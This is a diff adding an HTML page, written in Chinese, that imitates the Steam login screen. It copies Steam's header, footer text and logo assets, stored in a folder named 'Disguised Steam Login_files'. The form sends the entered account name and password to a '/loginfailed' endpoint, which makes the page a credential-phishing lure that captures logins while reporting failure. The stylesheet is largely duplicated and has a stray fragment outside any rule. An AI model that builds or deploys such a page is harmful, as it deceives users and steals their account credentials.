@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>登录</title>
+    <style>
+        body {
+            background: url('Disguised Steam Login_files/Background.jpg') no-repeat center center fixed; /* 添加背景图片 */
+            background-size: cover; /* 使背景图片覆盖整个页面 */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column; /* 使容器垂直排列 */
+        }
+        .top-container {
+            background-color: #171d25; /* 设置容器颜色 */
+            width: 100%; /* 设置容器宽度为整个网页宽度 */
+            height: 60px; /* 设置容器高度 */
+            /*position: absolute; /* 使容器左上角对齐网页左上角 */
+            top: 0;
+            left: 0;
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+        }
+        .top-container img {
+            left: 300px; 
+            height: 80px; /* 设置图片高度 */
+            margin-right: 20px; /* 图片和文字之间的间距 */
+        }
+        .top-container .store-text {
+            color: #1a9fff;
+            font-size: 24px;
+        }
+        .bottom-container {
+            background-color: #181a21; /* 设置容器颜色 */
+            width: 100%; /* 设置容器宽度为整个网页宽度 */
+            height: 20%; /* 设置容器高度 */
+            position: absolute; /* 固定定位 */
+            bottom: -50px; /* 放置在页面底部 */
+            display: flex;
+            align-items: center;
+            justify-content: center; /* 可选，水平居中内容 */
+            padding: 0 20px;
+            box-sizing: border-box; /* 确保padding不会增加容器的宽度 */
+        }
+        .bottom-container .bottom-text {
+            color: #b8b6b4;
+            font-size: 14px;
+            justify-content: center;
+            position: relative;
+            text-align: center;
+        }
+        .login-container {
+            background-color: rgba(24, 26, 33, 1); /* 设置登录容器背景颜色为不透明 */
+            padding: 30px; /* 高度缩小至0.75倍 */
+            border-radius: 15px; /* 增大边框圆角 */
+            color: white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5); /* 添加阴影效果 */
+            position: relative;
+            width: 570px; /* 宽度缩小至0.75倍 */
+        }
+        .login-container label,
+        .login-container input {
+            display: block;
+            margin-bottom: 5px; /* 缩短间距 */
+            font-size: 12px; /* 缩小字体至0.75倍 */
+        }
+        .login-container label[for="account"] {
+            color: #1999ff; /* 更改颜色 */
+        }
+        .login-container label[for="password"] {
+            color: #afafaf; /* 更改颜色 */
+        }
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: calc(100% - 30px); /* 使输入框宽度适应容器 */
+            padding: 9.75px; /* 缩小内边距至0.75倍 */
+            border: 1px solid #32353c; /* 更改描边颜色 */
+            border-radius: 2.5px; /* 添加圆角 */
+            margin-bottom: 20px; /* 缩短间距 */
+            background-color: #32353c; /* 更改输入框背景颜色 */
+            color: white;
+            height: calc(1.75 * 7.5px); /* 高度扩大至原来的1.75倍 */
+        }
+        .login-container input[type="text"]:focus,
+        .login-container input[type="password"]:focus {
+            border: 1px solid #32353c; /* 更改描边颜色 */
+        }
+        .login-container input[type="submit"] {
+            background: linear-gradient(to right, #07beff, #2d75ff); /* 更改按钮背景颜色为渐变 */
+            color: white;
+            border: none;
+            padding: 15px 105px; /* 高度和宽度缩小至0.75倍 */
+            cursor: pointer;
+            display: block;
+            margin: 0 auto;
+            font-size: 13.5px; /* 缩小字体至0.75倍 */
+            border-radius: 5px; /* 添加圆角 */
+            transition: background-color 0.3s ease; /* 添加过渡效果 */
+        }
+        .login-container input[type="submit"]:hover {
+            background-color: #005FB3; /* 鼠标悬停时更改按钮颜色 */
+        }
+        .login-title {
+            position: absolute;
+            top: -60px; /* 向上移动一半高度的像素 */
+            left: -1px; 
+            font-size: 26px; /* 字体缩小至0.75倍 */
+            font-weight: bold;
+            color: white;
+            padding: 0 10px; /* 添加内边距，使文字更清晰 */
+            border-radius: 5px; /* 添加圆角 */
+        }
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px; /* 缩短间距 */
+        }
+        .remember-me input[type="checkbox"] {
+            width: 15px;
+            height: 15px;
+            margin-right: 7.5px; /* 缩小内边距至0.75倍 */
+            background-color: #32353c; /* 更改背景颜色 */
+            border: 1px solid #32353c; /* 更改描边颜色 */
+            border-radius: 1.5px; /* 添加圆角 */
+            appearance: none; /* 移除默认样式 */
+            cursor: pointer;
+            position: relative;
+            top: -1px; /* 向上移动1个像素 */
+        }
+        .remember-me input[type="checkbox"]:checked {
+            background-color: #32353c; /* 更改背景颜色 */
+            color: white;
+        }
+        .remember-me input[type="checkbox"]:checked::before {
+            content: '✔';
+            display: block;
+            text-align: center;
+            color: white;
+            position: relative;
+            top: -1px; /* 向上移动1个像素 */
+        }
+        .remember-me label {
+            color: #afafaf; /* 更改颜色 */
+            font-size: 12px; /* 缩小字体至0.75倍 */
+        }
+        .help-link {
+            text-align: center;
+            color: #afafaf;
+            font-size: 12px;
+            text-decoration: underline;
+            margin-top: 10px;
+        }
+        body {
+            background: url('Disguised Steam Login_files/Background.jpg') no-repeat center center fixed; /* 添加背景图片 */
+            background-size: cover; /* 使背景图片覆盖整个页面 */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column; /* 使容器垂直排列 */
+        }
+        .top-container {
+            background-color: #171d25; /* 设置容器颜色 */
+            width: 100%; /* 设置容器宽度为整个网页宽度 */
+            height: 100px; /* 设置容器高度 */
+            position: absolute; /* 使容器左上角对齐网页左上角 */
+            top: 0;
+            left: 0;
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+        }
+        .top-container img {
+            height: 50px; /* 设置图片高度缩小0.5倍 */
+            margin-right: 20px; /* 图片和文字之间的间距 */
+        }
+        .top-container .store-text {
+            color: #1a9fff;
+            font-size: 17px;
+            margin-right: 20px; /* 添加间距 */
+            text-decoration: underline;
+        }
+        .top-container .community-text{
+            color: #dcdedf;
+            font-size: 17px;
+            margin-right: 20px; /* 添加间距 */
+        }
+        .top-container .about-text{
+            color: #dcdedf;
+            font-size: 17px;
+            margin-right: 20px; /* 添加间距 */
+        }
+        .top-container img {
+            height: 50px; /* 设置图片高度缩小0.5倍 */
+            margin-right: 20px; /* 图片和文字之间的间距 */
+            transform: translateX(450px); /* 向左移动500像素 */
+        }
+        .top-container .store-text {
+            color: #1a9fff;
+            font-size: 17px;
+            margin-right: 20px; /* 添加间距 */
+            text-decoration: underline;
+            transform: translateX(450px); /* 向左移动500像素 */
+        }
+        .top-container .community-text {
+            color: #dcdedf;
+            font-size: 17px;
+            margin-right: 20px; /* 添加间距 */
+            transform: translateX(450px); /* 向左移动500像素 */
+        }
+        .top-container .about-text {
+            color: #dcdedf;
+            font-size: 17px;
+            margin-right: 20px; /* 添加间距 */
+            transform: translateX(450px); /* 向左移动500像素 */
+        }
+        .top-container .support-text {
+            color: #dcdedf;
+            font-size: 17px;
+            margin-right: 20px; /* 添加间距 */
+            transform: translateX(450px); /* 向左移动500像素 */
+        }
+            color: #dcdedf;
+            font-size: 17px;
+            margin-right: 20px; /* 添加间距 */
+        }
+        .login-container {
+            background-color: rgba(24, 26, 33, 1); /* 设置登录容器背景颜色为不透明 */
+            padding: 30px; /* 高度缩小至0.75倍 */
+            border-radius: 15px; /* 增大边框圆角 */
+            color: white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5); /* 添加阴影效果 */
+            position: relative;
+            width: 570px; /* 宽度缩小至0.75倍 */
+        }
+        .login-container label,
+        .login-container input {
+            display: block;
+            margin-bottom: 5px; /* 缩短间距 */
+            font-size: 12px; /* 缩小字体至0.75倍 */
+        }
+        .login-container label[for="account"] {
+            color: #1999ff; /* 更改颜色 */
+        }
+        .login-container label[for="password"] {
+            color: #afafaf; /* 更改颜色 */
+        }
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: calc(100% - 30px); /* 使输入框宽度适应容器 */
+            padding: 9.75px; /* 缩小内边距至0.75倍 */
+            border: 1px solid #32353c; /* 更改描边颜色 */
+            border-radius: 2.5px; /* 添加圆角 */
+            margin-bottom: 20px; /* 缩短间距 */
+            background-color: #32353c; /* 更改输入框背景颜色 */
+            color: white;
+            height: calc(1.75 * 7.5px); /* 高度扩大至原来的1.75倍 */
+        }
+        .login-container input[type="text"]:focus,
+        .login-container input[type="password"]:focus {
+            border: 1px solid #32353c; /* 更改描边颜色 */
+        }
+        .login-container input[type="submit"] {
+            background: linear-gradient(to right, #07beff, #2d75ff); /* 更改按钮背景颜色为渐变 */
+            color: white;
+            border: none;
+            padding: 15px 105px; /* 高度和宽度缩小至0.75倍 */
+            cursor: pointer;
+            display: block;
+            margin: 0 auto;
+            font-size: 13.5px; /* 缩小字体至0.75倍 */
+            border-radius: 5px; /* 添加圆角 */
+            transition: background-color 0.3s ease; /* 添加过渡效果 */
+        }
+        .login-container input[type="submit"]:hover {
+            background-color: #005FB3; /* 鼠标悬停时更改按钮颜色 */
+        }
+        .login-title {
+            position: absolute;
+            top: -60px; /* 向上移动一半高度的像素 */
+            left: -1px; 
+            font-size: 26px; /* 字体缩小至0.75倍 */
+            font-weight: bold;
+            color: white;
+            padding: 0 10px; /* 添加内边距，使文字更清晰 */
+            border-radius: 5px; /* 添加圆角 */
+        }
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px; /* 缩短间距 */
+        }
+        .remember-me input[type="checkbox"] {
+            width: 15px;
+            height: 15px;
+            margin-right: 7.5px; /* 缩小内边距至0.75倍 */
+            background-color: #32353c; /* 更改背景颜色 */
+            border: 1px solid #32353c; /* 更改描边颜色 */
+            border-radius: 1.5px; /* 添加圆角 */
+            appearance: none; /* 移除默认样式 */
+            cursor: pointer;
+            position: relative;
+            top: -1px; /* 向上移动1个像素 */
+        }
+        .remember-me input[type="checkbox"]:checked {
+            background-color: #32353c; /* 更改背景颜色 */
+            color: white;
+        }
+        .remember-me input[type="checkbox"]:checked::before {
+            content: '✔';
+            display: block;
+            text-align: center;
+            color: white;
+            position: relative;
+            top: -1px; /* 向上移动1个像素 */
+        }
+        .remember-me label {
+            color: #afafaf; /* 更改颜色 */
+            font-size: 12px; /* 缩小字体至0.75倍 */
+        }
+        .help-link {
+            text-align: center;
+            color: #afafaf;
+            font-size: 12px;
+            text-decoration: underline;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="top-container">
+        <img src="Disguised Steam Login_files/Head Logo.png" alt="Logo">
+        <div class="store-text">商店</div>
+        <div class="community-text">社区</div>
+        <div class="about-text">关于</div>
+        <div class="support-text">客服</div>
+    </div>
+    <div class="login-container">
+        <div class="login-title">登录</div>
+        <form action="/loginfailed" method="post">
+            <label for="account">用账户名称登录</label>
+            <input type="text" id="account" name="account">
+            <label for="password">密码</label>
+            <input type="password" id="password" name="password">
+            <div class="remember-me">
+                <input type="checkbox" id="remember" name="remember" checked>
+                <label for="remember">记住我</label>
+            </div>
+            <input type="submit" value="登录">
+        </form>
+        <div class="help-link">请求帮助，我无法登录</div>
+    </div>
+    <div class="bottom-container">
+        <div class="bottom-text">首次使用Steam？<br>创建帐户既免费又简单。探索成千上万款游戏，<br>与数百万新朋友一起畅玩吧！了解更多关于 <br>Steam 的信息</div>
+    </div>
+</body>
+</html>
